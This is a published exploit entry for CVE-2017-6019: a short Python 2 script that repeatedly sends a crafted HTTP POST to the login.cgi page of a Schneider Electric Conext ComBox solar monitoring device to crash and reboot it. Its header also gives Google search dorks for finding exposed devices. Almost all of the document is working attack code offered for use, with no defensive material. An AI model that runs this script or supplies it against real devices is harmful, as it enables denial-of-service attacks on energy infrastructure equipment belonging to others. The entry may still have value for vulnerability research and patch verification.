#Exploit Title: Conext ComBox - Denial of Service (HTTP-POST)
#Description: The exploit cause the device to self-reboot, constituting a denial of service.
#Google Dork: "Conext ComBox" + "JavaScript was not detected" /OR/ "Conext ComBox" + "Recover Lost Password"
#Date: March 02, 2017
#Exploit Author: Mark Liapustin & Arik Kublanov
#Vendor Homepage: http://solar.schneider-electric.com/product/conext-combox/
#Software Link: http://cdn.solar.schneider-electric.com/wp-content/uploads/2016/06/conext-combox-data-sheet-20160624.pdf
#Version: All firmware versions prior to V3.03 BN 830
#Tested on: Windows and Linux
#CVE: CVE-2017-6019

# Use this script with caution!
# Mark Liapustin: https://www.linkedin.com/in/clizsec/
# Arik Kublanov: https://www.linkedin.com/in/arik-kublanov-57618a64/
# =========================================================
import subprocess
import os
import sys
import time
import socket
# =========================================================

print 'Usage: python ComBoxDos.py IP PORT'
print 'Number of arguments:', len(sys.argv), 'arguments.'
print 'Argument List:', str(sys.argv)

print "ComBox Denial of Service via HTTP-POST Request"
global cmdosip
cmdosip = str(sys.argv[1])
port = int(sys.argv[2])
print "[!] The script will cause the Conext ComBox device to crash and to reboot itself."
		
print "Executing...\n\n\n"
for i in range(1, 1000):
  try:
	cmdosdir = "login.cgi?login_username=Nation-E&login_password=DOS&submit=Log+In"
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((cmdosip, port))
	print "[+] Sent HTTP POST Request to: " + cmdosip + " with /" + cmdosdir + " HTTP/1.1"
	s.send("POST /" + cmdosdir + " HTTP/1.1\r\n")
	s.send("Host: " + cmdosip + "\r\n\r\n")
	s.close()
  except: 
     pass